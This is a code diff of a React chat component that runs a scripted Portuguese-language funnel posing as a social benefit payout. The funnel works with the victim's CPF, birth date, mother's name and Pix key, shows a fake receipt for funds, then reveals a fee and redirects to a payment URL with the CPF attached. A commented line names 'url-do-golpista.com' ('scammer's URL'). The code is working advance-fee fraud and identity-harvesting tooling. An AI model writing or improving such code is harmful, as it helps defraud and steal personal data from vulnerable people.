@@ -62,10 +62,10 @@ interface FlowStepDataTextInput {
 
 interface FlowStepDataDisplayDynamicImage {
     message: string;
-    templateUrl?: string; 
-    dataMapping?: any[]; 
-    imageAiHint?: string; 
-    imageAltText?: string; 
+    templateUrl?: string;
+    dataMapping?: any[];
+    imageAiHint?: string;
+    imageAltText?: string;
 }
 
 interface FlowStep {
@@ -105,7 +105,7 @@ const funnelDefinition: {
       "delay_ms": 1000,
       "data": {
         "message": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
-        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4", 
+        "videoUrl": "https://225412.b-cdn.net/Programa%20Saque%20Social.mp4",
         "thumbnailText": "Clique para Assistir e Iniciar"
       },
       "nextStep": "step2_intro_and_ask_mother"
@@ -174,7 +174,7 @@ const funnelDefinition: {
         ]
       }
     },
-    "step7_confirm_pix_key": { 
+    "step7_confirm_pix_key": {
       "type": "multipleChoice",
       "delay_ms": 1500,
       "data": {
@@ -185,7 +185,7 @@ const funnelDefinition: {
         ]
       }
     },
-    "step7_input_pix_key": { 
+    "step7_input_pix_key": {
       "type": "textInput",
       "delay_ms": 1000,
       "data": {
@@ -195,7 +195,7 @@ const funnelDefinition: {
       },
       "nextStep": "step7b_confirm_manual_pix_key"
     },
-    "step7b_confirm_manual_pix_key": { 
+    "step7b_confirm_manual_pix_key": {
         "type": "multipleChoice",
         "delay_ms": 1500,
         "data": {
@@ -242,10 +242,17 @@ const funnelDefinition: {
       }
     },
     "step11_generating_receipt_image": {
-      "type": "displayMessage", 
+      "type": "displayMessage", // Simplified from displayDynamicImage
       "delay_ms": 1000,
       "data": {
         "message": "Gerando seu comprovante de recebimento dos valores..."
+        // "templateUrl": "https://url-do-golpista.com/images/comprovante_template.png",
+        // "dataMapping": [
+        //   {"variable": "{{userName}}", "x": 50, "y": 120, "font": "Arial", "size": 12},
+        //   {"variable": "{{indenizacaoValor}}", "x": 50, "y": 155, "font": "Arial Bold", "size": 14},
+        //   {"variable": "{{userCPF}}", "x": 50, "y": 250, "font": "Arial", "size": 10},
+        //   {"variable": "{{taxaValor}}", "x": 450, "y": 180, "font": "Arial Bold", "size": 12, "color": "#008000"}
+        // ]
       },
       "nextStep": "step12_reveal_tax_and_audio"
     },
@@ -285,9 +292,9 @@ const funnelDefinition: {
 const STORAGE_KEY_MESSAGES = 'simulatedChatMessages_v2_1';
 const STORAGE_KEY_STEP = 'simulatedChatCurrentStepKey_v2_1';
 const STORAGE_KEY_VARIABLES = 'simulatedChatFlowVariables_v2_1';
-const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1'; 
+const STORAGE_KEY_SESSION_CPF = 'simulatedChatSessionCpf_v2_1';
 
-const DEFAULT_APPEARANCE_DELAY_MS = 3000; 
+const DEFAULT_APPEARANCE_DELAY_MS = 500; // Fallback delay if not specified in step
 
 const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
@@ -302,9 +309,9 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         userCPF: initialParams.cpf || '---.---.---.--',
         userBirthDate: initialParams.nascimento || '--/--/----',
         userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
-        randomMotherName1: 'Maria da Silva Souza', 
-        randomMotherName2: 'Joana Oliveira Costa', 
-        chavePix: initialParams.cpf || '---.---.---.--', 
+        randomMotherName1: 'Maria da Silva Souza',
+        randomMotherName2: 'Joana Oliveira Costa',
+        chavePix: initialParams.cpf || '---.---.---.--',
     };
   });
 
@@ -335,13 +342,12 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (typeof window === 'undefined') return;
 
     const currentCpfFromParams = initialParams.cpf;
-    const currentNameFromParams = initialParams.nome; 
+    const currentNameFromParams = initialParams.nome;
     const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
     const storedSessionIdentifier = sessionStorage.getItem(STORAGE_KEY_SESSION_CPF);
 
     let shouldResetChat = false;
 
-    
     const defaultGlobalVars = funnelDefinition.globalVariables || {};
     const defaultFlowVars = {
         ...defaultGlobalVars,
@@ -352,7 +358,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         userMotherName: initialParams.mae || 'Nome da Mãe Indisponível',
         randomMotherName1: 'Maria da Silva Souza',
         randomMotherName2: 'Joana Oliveira Costa',
-        chavePix: initialParams.cpf || '---.---.---.--', 
+        chavePix: initialParams.cpf || '---.---.---.--',
     };
 
     if (currentCpfFromParams && storedSessionIdentifier === sessionIdentifier) {
@@ -366,18 +372,16 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                          : funnelDefinition.initialStep;
       setCurrentStepKey(stepToSet);
 
-      
       const newFlowVariables = { ...defaultFlowVars };
       if (savedFlowVars) {
         const parsedSaved = JSON.parse(savedFlowVars);
         newFlowVariables.chavePix = parsedSaved.chavePix || defaultFlowVars.chavePix;
-        
         Object.keys(defaultGlobalVars).forEach(key => {
             if (parsedSaved[key] !== undefined) newFlowVariables[key] = parsedSaved[key];
         });
       }
       setFlowVariables(newFlowVariables);
-      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]"); 
+      justLoadedSessionRef.current = (savedMessages && savedMessages !== "[]");
     } else {
       shouldResetChat = true;
     }
@@ -386,20 +390,18 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       sessionStorage.removeItem(STORAGE_KEY_MESSAGES);
       sessionStorage.removeItem(STORAGE_KEY_STEP);
       sessionStorage.removeItem(STORAGE_KEY_VARIABLES);
-
-      if (currentCpfFromParams) { 
+      if (currentCpfFromParams) {
         sessionStorage.setItem(STORAGE_KEY_SESSION_CPF, sessionIdentifier);
       } else {
-        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF); 
+        sessionStorage.removeItem(STORAGE_KEY_SESSION_CPF);
       }
-
       setMessages([]);
       setCurrentStepKey(funnelDefinition.initialStep);
-      setFlowVariables(defaultFlowVars); 
-      prevCurrentStepKeyRef.current = undefined; 
+      setFlowVariables(defaultFlowVars);
+      prevCurrentStepKeyRef.current = undefined;
       justLoadedSessionRef.current = false;
     }
-  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]); 
+  }, [initialParams.cpf, initialParams.nome, initialParams.mae, initialParams.nascimento]);
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
@@ -427,7 +429,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     const currentNameFromParams = initialParams.nome;
     const sessionIdentifier = `${currentCpfFromParams}_${currentNameFromParams}`;
     if (sessionStorage.getItem(STORAGE_KEY_SESSION_CPF) === sessionIdentifier) {
-      
       const persistableFlowVariables: Record<string, any> = {};
       Object.keys(flowVariables).forEach(key => {
         if (key in funnelDefinition.globalVariables || ['chavePix', 'userName', 'userCPF', 'userBirthDate', 'userMotherName'].includes(key)) {
@@ -442,29 +443,25 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const formatText = (text: string | undefined): string => {
     if (!text) return '';
     let formattedText = text;
-    
     const allVars = {
-        ...initialParams, 
-        ...(funnelDefinition.globalVariables || {}), 
-        ...flowVariables, 
+        ...initialParams,
+        ...(funnelDefinition.globalVariables || {}),
+        ...flowVariables,
     };
 
     for (const key in allVars) {
       const placeholder = `{{${key}}}`;
       let valueToInsert = String(allVars[key]);
 
-      
       if (valueToInsert !== undefined && valueToInsert !== null && valueToInsert.toLowerCase() !== "null" && valueToInsert.toLowerCase() !== "undefined") {
-        
-        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) { 
+        if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
             valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
+        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) {
             const datePart = valueToInsert.split('T')[0];
             const parts = datePart.split('-');
-            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`; 
+            if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
         }
-        
-        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert === valueToInsert.toLowerCase()) {
+        else if ((key === 'userName' || key === 'userMotherName') && valueToInsert && valueToInsert === valueToInsert.toLowerCase()) {
              valueToInsert = valueToInsert
                 .split(' ')
                 .map(word => word.charAt(0).toUpperCase() + word.slice(1))
@@ -472,7 +469,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         }
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
       } else {
-         
          formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), '---');
       }
     }
@@ -493,54 +489,49 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         clearTimeout(autoTransitionTimerRef.current);
         autoTransitionTimerRef.current = null;
     }
-    
     setCurrentDisplayMessage(null);
     setCurrentImageDetails(null);
     setIsLoadingStep(false);
     setLoadingMessage(null);
-    
     if (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.type !== 'displayVideo') {
         videoPlaceholderData.current = null;
         setCurrentVideoMessage(null);
     }
-    setIsTextInputActive(false); 
+    setIsTextInputActive(false);
     setCurrentTextInputConfig(null);
 
     if (nextStepKey && funnelDefinition.steps[nextStepKey as keyof typeof funnelDefinition.steps]) {
         setCurrentStepKey(nextStepKey);
     } else if (nextStepKey) {
         console.error("SimulatedChatFlow: Invalid nextStepKey referenced:", nextStepKey);
-        
     }
   };
 
   useEffect(() => {
     if (typeof window === 'undefined') return;
-    setIsBotTyping(true); 
+
+    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;
+
+    if (!stepConfig) {
+      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
+      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
+        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
+      }
+      setIsBotTyping(false);
+      return;
+    }
+
+    setIsBotTyping(true);
 
     if (autoTransitionTimerRef.current) {
       clearTimeout(autoTransitionTimerRef.current);
       autoTransitionTimerRef.current = null;
     }
 
-    const stepConfig = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep | undefined;
-
-    if (!stepConfig) {
-      console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
-      
-      if (prevCurrentStepKeyRef.current !== currentStepKey && !justLoadedSessionRef.current) {
-        setMessages(prev => [...prev, {id: `err-invalid-step-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro interno no fluxo."}]);
-      }
-      setIsBotTyping(false); 
-      return;
-    }
-
     const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
-    
     let processAsNewStep = (isNewStep && !justLoadedSessionRef.current) ||
                            (justLoadedSessionRef.current && stepConfig.type === 'displayVideo' && isNewStep);
 
-    
     if (isNewStep && !(justLoadedSessionRef.current && stepConfig.type === 'displayVideo')) {
       setIsLoadingStep(false);
       setLoadingMessage(null);
@@ -553,12 +544,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         setCurrentVideoMessage(null);
       }
     }
-    
-    const effectiveAppearanceDelay = (stepConfig?.type === 'loadingScreen') ? 0 : (stepConfig?.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS);
 
+    const effectiveAppearanceDelay = stepConfig.delay_ms ?? DEFAULT_APPEARANCE_DELAY_MS;
 
     const typingTimer = setTimeout(() => {
-      const processStepAfterDelayInternal = () => { 
+      const processStepAfterDelayInternal = () => {
         if (processAsNewStep) {
           switch (stepConfig.type) {
             case 'displayVideo': {
@@ -566,8 +556,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentVideoMessage(formatText(data.message));
               videoPlaceholderData.current = { ...data, thumbnailText: data.thumbnailText || "Clique para Assistir" };
               setShowVideoPlaceholderOverlay(true);
-              setIsBotTyping(false); 
-              return; 
+              // No setIsBotTyping(false) here; wait for user interaction
+              return;
             }
             case 'multipleChoice': {
               const data = stepConfig.data as FlowStepDataMultipleChoice;
@@ -579,15 +569,15 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               const data = stepConfig.data as FlowStepDataLoading;
               setLoadingMessage(formatText(data.message));
               setIsLoadingStep(true);
-              setIsBotTyping(false); 
               autoTransitionTimerRef.current = setTimeout(() => {
-                if (prevCurrentStepKeyRef.current === currentStepKey) { 
+                if (prevCurrentStepKeyRef.current === currentStepKey) {
                   setIsLoadingStep(false);
                   setLoadingMessage(null);
                   if (stepConfig.nextStep) handleUserActionAndNavigate(stepConfig.nextStep);
                 }
               }, data.duration_ms);
-              return; 
+              setIsBotTyping(false); // Loading itself is the content
+              return;
             }
             case 'displayMessage': {
               const data = stepConfig.data as FlowStepDataDisplayMessage;
@@ -611,21 +601,21 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setCurrentTextInputConfig(data);
               setIsTextInputActive(true);
               setTextInputValue("");
-              setIsBotTyping(false); 
-              return; 
+              // No setIsBotTyping(false) here; wait for user input
+              return;
             }
             case 'displayDynamicImage': {
+              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented.");
               const data = stepConfig.data as FlowStepDataDisplayDynamicImage;
-              console.warn("SimulatedChatFlow: 'displayDynamicImage' step type is simplified. Actual image generation with text overlay is not implemented. Displaying message and fallback image if URL provided.");
               const messageToShow = formatText(data.message) || "Gerando seu comprovante...";
-              if (data.templateUrl) { 
+               if (data.templateUrl) {
                 setCurrentImageDetails({
                     url: data.templateUrl,
                     alt: formatText(data.imageAltText) || "Comprovante",
                     message: messageToShow,
                     aiHint: data.imageAiHint
                 });
-              } else { 
+              } else {
                 setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: messageToShow}]);
               }
               break;
@@ -635,18 +625,11 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
               setMessages(prev => [...prev, {id: `err-type-new-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
           }
         } else if (isNewStep && justLoadedSessionRef.current) {
-          
-          
           if (stepConfig.type === 'multipleChoice') {
             const lastMessage = messages[messages.length - 1];
             const data = stepConfig.data as FlowStepDataMultipleChoice;
             const formattedOptions = data.options.map(opt => ({ ...opt, text: formatText(opt.text) }));
-            
-            if (messages.length === 0 || (lastMessage && lastMessage.sender === 'user') ||
-                (lastMessage && !lastMessage.options) ||
-                (lastMessage && stepConfig.type === 'multipleChoice' && 
-                    (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions)))
-            ) {
+            if (messages.length === 0 || (lastMessage && lastMessage.sender === 'user') || (lastMessage && !lastMessage.options) || (lastMessage && stepConfig.type === 'multipleChoice' && (lastMessage.text !== formatText(data.message) || JSON.stringify(lastMessage.options) !== JSON.stringify(formattedOptions)))) {
                setMessages(prev => [...prev, { id: `bot-session-load-opts-${Date.now()}`, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
             }
           } else if (stepConfig.type === 'textInput') {
@@ -683,11 +666,10 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                     }
                 }
           }
-        } else { 
-          
+        } else {
           if (currentDisplayMessage) {
              const data = funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage;
-              if (data && data.type === 'displayMessage') { 
+              if (data && data.type === 'displayMessage') {
                    setCurrentDisplayMessage(prev => prev ? {
                       ...prev,
                       displayTitle: formatText(data.title),
@@ -710,7 +692,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                    }
               } else if (lastMessage.sender === 'bot' && !lastMessage.options && (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage')) {
                   const data = stepConfig.data as (FlowStepDataDisplayMessage | FlowStepDataDisplayDynamicImage);
-                  
                   if (data && data.message && !(data as FlowStepDataDisplayMessage).title && !(data as FlowStepDataDisplayMessage).details && stepConfig.type !== 'displayDynamicImage') {
                        setMessages(prevMsgs => prevMsgs.map((msg, index) => {
                           if (index === prevMsgs.length -1) { return { ...msg, text: formatText(data.message!) }; }
@@ -721,7 +702,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           }
         }
 
-        
         const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                   (stepConfig.type === 'displayMessage' || stepConfig.type === 'displayDynamicImage');
 
@@ -733,31 +713,25 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
         if (canAutoTransition && (processAsNewStep || (isNewStep && justLoadedSessionRef.current))) {
           autoTransitionTimerRef.current = setTimeout(() => {
-            if (prevCurrentStepKeyRef.current === currentStepKey) { 
+            if (prevCurrentStepKeyRef.current === currentStepKey) {
                handleUserActionAndNavigate(stepConfig.nextStep as string);
             }
           }, nextStepTransitionDelayMs);
         }
-        
-      }; 
+        setIsBotTyping(false); // Content is now ready or waiting for interaction
+      };
 
       processStepAfterDelayInternal();
-      
-      if (justLoadedSessionRef.current && isNewStep) { 
+
+      if (justLoadedSessionRef.current && isNewStep) {
           justLoadedSessionRef.current = false;
       }
 
-      if (stepConfig.type !== 'displayVideo' && stepConfig.type !== 'loading' && stepConfig.type !== 'textInput' ) {
-          setIsBotTyping(false); 
-      }
+    }, effectiveAppearanceDelay);
 
-    }, effectiveAppearanceDelay); 
-
-    
-    if (isNewStep) { 
+    if (isNewStep) {
       prevCurrentStepKeyRef.current = currentStepKey;
     }
-    
 
     return () => {
       clearTimeout(typingTimer);
@@ -766,7 +740,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         autoTransitionTimerRef.current = null;
       }
     };
-  }, [currentStepKey, initialParams]); 
+  }, [currentStepKey, initialParams]);
 
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
@@ -774,19 +748,46 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
 
   const handleOptionClick = (option: ChatOption) => {
+    if (autoTransitionTimerRef.current) {
+      clearTimeout(autoTransitionTimerRef.current);
+      autoTransitionTimerRef.current = null;
+    }
+
+    const userMessageText = option.text || "Opção selecionada"; // Fallback for safety
     const userMessageId = `user-${Date.now()}`;
-    setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
-    
-    
+
+    setMessages(prevMsgs => {
+      const msgsWithUserReply = [...prevMsgs, { id: userMessageId, sender: 'user', text: userMessageText }];
+      let repliedToBotMessageIndex = -1;
+      for (let i = msgsWithUserReply.length - 2; i >= 0; i--) {
+        if (msgsWithUserReply[i].sender === 'bot' && msgsWithUserReply[i].options && msgsWithUserReply[i].options.length > 0) {
+          repliedToBotMessageIndex = i;
+          break;
+        }
+      }
+
+      if (repliedToBotMessageIndex !== -1) {
+        const finalMsgs = [...msgsWithUserReply];
+        const updatedBotMessage = { ...finalMsgs[repliedToBotMessageIndex], options: undefined };
+        finalMsgs[repliedToBotMessageIndex] = updatedBotMessage;
+        return finalMsgs;
+      }
+      return msgsWithUserReply;
+    });
+
     setCurrentDisplayMessage(null);
     setCurrentImageDetails(null);
     setIsLoadingStep(false);
     setLoadingMessage(null);
-    
-    setIsBotTyping(true); 
+    videoPlaceholderData.current = null;
+    setCurrentVideoMessage(null);
+    setIsTextInputActive(false);
+    setCurrentTextInputConfig(null);
+
+    setIsBotTyping(true);
 
     if (option.action === 'setChavePixToUserCPF') {
-        const cpfToSet = flowVariables.userCPF || "CPF não disponível"; 
+        const cpfToSet = flowVariables.userCPF || "CPF não disponível";
         setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
     }
 
@@ -794,30 +795,26 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         let finalPaymentUrl = formatText(option.paymentUrl);
         try {
             const url = new URL(finalPaymentUrl);
-             
              Object.entries(initialParams).forEach(([key, value]) => {
                 if (value && !url.searchParams.has(key) && ['gclid', 'utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].includes(key)) {
                     url.searchParams.set(key, value as string);
                 }
             });
-            
-            if (initialParams.cpf && !url.searchParams.has('cpf')) {
-                url.searchParams.set('cpf', initialParams.cpf);
-            }
+            if (initialParams.cpf && !url.searchParams.has('cpf')) url.searchParams.set('cpf', initialParams.cpf);
             window.location.href = url.toString();
         } catch (e) {
             console.error("Invalid payment URL:", finalPaymentUrl, e);
             setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento." }]);
         }
-        setIsBotTyping(false); 
+        setIsBotTyping(false);
         return;
     }
 
     if (option.nextStep) {
       handleUserActionAndNavigate(option.nextStep);
-    } else if (!option.action) { 
+    } else if (!option.action) {
         console.warn("SimulatedChatFlow: Option clicked with no nextStep and no action:", option);
-        setIsBotTyping(false); 
+        setIsBotTyping(false);
     }
   };
 
@@ -826,60 +823,48 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     if (stepConfig?.type !== 'displayVideo') return;
 
     setShowVideoPlaceholderOverlay(false);
-    
-    
-    
-    setIsBotTyping(true); 
+    setIsBotTyping(true);
 
     if (stepConfig.nextStep) {
         handleUserActionAndNavigate(stepConfig.nextStep as string);
     } else {
-        setIsBotTyping(false); 
+        setIsBotTyping(false);
     }
   };
 
   const handleTextInputFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-
     if (!currentTextInputConfig || !textInputValue.trim()) {
         const tempMsgId = `err-input-${Date.now()}`;
-        
         setMessages(prev => [...prev, {id: tempMsgId, sender: 'bot', text: "Por favor, preencha o campo."}]);
-        
         setTimeout(() => setMessages(prev => prev.filter(m => m.id !== tempMsgId)), 2000);
         return;
     }
 
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
-    
-    
     setIsTextInputActive(false);
-    
-    
-    setIsBotTyping(true); 
+    setIsBotTyping(true);
 
     if (currentTextInputConfig.variableToSet === 'chavePix') {
         setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
     }
-    setTextInputValue(""); 
+    setTextInputValue("");
 
     const nextStepKey = (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep)?.nextStep;
     if (nextStepKey) {
         handleUserActionAndNavigate(nextStepKey);
     } else {
-        setIsBotTyping(false); 
+        setIsBotTyping(false);
     }
   };
 
   const getIconComponent = (iconName?: string) => {
     if (!iconName) return null;
-    
     if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: '#27AE60', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
     if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: '#F7B731', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
-    if (iconName.includes('currency_dollar_gov_style')) { 
+    if (iconName.includes('currency_dollar_gov_style')) {
       return <span style={{fontSize: '20px', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0, filter: 'grayscale(1) brightness(0.8)'}}>💰</span>;
     }
-    
     return null;
   }
 
@@ -914,7 +899,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 </span>
               </div>
             )}
-             
              { !showVideoPlaceholderOverlay && <span style={{color: 'white'}}>Vídeo Iniciado (Simulado)</span> }
           </div>
         </div>
@@ -935,8 +919,8 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             <Image
               src={currentImageDetails.url}
               alt={currentImageDetails.alt}
-              width={300} 
-              height={200} 
+              width={300}
+              height={200}
               data-ai-hint={currentImageDetails.aiHint || "illustration"}
               style={{ borderRadius: '8px', maxWidth: '100%', height: 'auto', display: 'block' }}
             />
@@ -947,8 +931,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       {currentDisplayMessage && !isLoadingStep && !isBotTyping && (
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: 'auto', display: 'flex'}}>
-           
-           <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}> 
+           <div className="message bot-message" style={{width: 'auto', maxWidth: '100%'}}>
               {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                 {getIconComponent(currentDisplayMessage.displayIcon)}
                 <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
@@ -964,7 +947,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                   ))}
                 </div>
               )}
-               
                { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                 <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                     <strong>Nota:</strong> {formatText(((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps] as FlowStep).data as FlowStepDataDisplayMessage)?.note)}
@@ -976,18 +958,19 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
-            
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
               {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
-              
-              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
+              {msg.sender === 'bot' && msg.options &&
+               !isBotTyping && !isTextInputActive &&
+               !videoPlaceholderData.current && !isLoadingStep &&
+               !currentDisplayMessage && !currentImageDetails && (
                 <div className="options-container">
                   {msg.options.map(opt => (
                     <button
-                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')} 
+                      key={opt.text + (opt.nextStep || '') + (opt.action || '') + (opt.paymentUrl || '')}
                       onClick={() => handleOptionClick(opt)}
-                      className={`chat-option-button ${opt.style || ''}`} 
-                       dangerouslySetInnerHTML={{__html: opt.text}} 
+                      className={`chat-option-button ${opt.style || ''}`}
+                       dangerouslySetInnerHTML={{__html: opt.text}}
                     />
                   ))}
                 </div>
@@ -1004,7 +987,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             value={textInputValue}
             onChange={(e) => setTextInputValue(e.target.value)}
             placeholder={formatText(currentTextInputConfig.placeholder)}
-            className="chat-text-input" 
+            className="chat-text-input"
             style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
             autoFocus
           />
@@ -1016,7 +999,6 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       {isBotTyping && (
          <div className="message-container bot-message-container">
-            
             <div className="message bot-message typing-indicator">
                 <span className="dot"></span><span className="dot"></span><span className="dot"></span>
             </div>
@@ -1024,70 +1006,58 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       )}
       <div ref={chatEndRef} />
       <style jsx>{`
-        .simulated-chat-container::-webkit-scrollbar { display: none; } 
-        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; } 
+        .simulated-chat-container::-webkit-scrollbar { display: none; }
+        .simulated-chat-container { -ms-overflow-style: none; scrollbar-width: none; }
 
         .message-container {
           display: flex;
           margin-bottom: 12px;
-          max-width: 90%; 
+          max-width: 90%;
         }
         .bot-message-container {
-          align-self: flex-start; 
+          align-self: flex-start;
         }
         .user-message-container {
-          align-self: flex-end; 
-          flex-direction: row-reverse; 
+          align-self: flex-end;
+          flex-direction: row-reverse;
         }
 
         .message {
           padding: 10px 15px;
-          border-radius: 18px; 
+          border-radius: 18px;
           line-height: 1.4;
           font-size: 15px;
-          word-wrap: break-word; 
+          word-wrap: break-word;
           box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-          width: auto; 
-          max-width: 100%; 
+          width: auto;
+          max-width: 100%;
         }
         .bot-message {
-          background-color: #e9ecef; 
+          background-color: #e9ecef;
           color: #333;
-          border-bottom-left-radius: 4px; 
+          border-bottom-left-radius: 4px;
         }
         .user-message {
-          background-color: #007bff; 
+          background-color: #007bff;
           color: white;
-          border-bottom-right-radius: 4px; 
-          margin-left: auto; 
+          border-bottom-right-radius: 4px;
+          margin-left: auto;
         }
-
-        
-        .bot-avatar {
-          border-radius: 50%;
-          margin-right: 8px;
-          align-self: flex-end; 
-          object-fit: cover; 
-          flex-shrink: 0; 
-        }
